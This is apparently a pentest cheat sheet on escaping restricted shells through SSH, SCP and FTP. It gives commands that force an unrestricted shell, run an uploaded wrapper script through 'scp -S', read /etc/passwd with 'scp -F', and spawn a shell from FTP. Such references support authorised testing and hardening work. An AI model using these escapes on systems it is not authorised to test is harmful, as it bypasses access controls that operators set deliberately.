# Remote Clients

## 01 - OpenSSH

### 1.1 - SSH

SSH on your machine to execute commands before the shell is loaded.

```
$ ssh [-p <PORT>] <username>@<IP> -t "/bin/sh"
```

Start the shell without loading "rc" profile (where most limits are configured):

```
$ ssh [-p <PORT>] <username>@<IP> -t "bash --noprofile"
```

Try to execute other commands.

```
$ ssh [-p <PORT>] <username>@<IP> <commands>
```

Sometimes just disabling pseudo-TTY allocation (`-T`) will work.

```
$ ssh [-p <PORT>] -T <username>@<IP>
```

### 1.2 - SCP

SCP: On a box that you control make a simple wrapper script, then upload it:

```
$ cat /tmp/id.sh
#!/bin/sh
/usr/bin/id

$ chmod +x /tmp/id.sh

$ scp /tmp/id.sh untrusted@demobox:
```

Once the file is uploaded, run it with scp:

```
untrusted@demobox ~ $ scp -S /home/untrusted/id.sh x y:
uid=1008(untrusted) gid=1014(untrusted) groups=1014(untrusted)
```

SCP: This options can be used to `cat` certain types of file:

```
$ scp -F /etc/passwd x y:
```

works best in a wrapper

```
$ scp -S /tmp/getMeOut.sh x y:
```

## 02 - FTP

```
$ ftp
ftp> !/bin/sh

ftp> !/bin/bash
```

---
## References

### GTFOBins

- [GTFOBins: SSH](https://gtfobins.github.io/gtfobins/ssh/)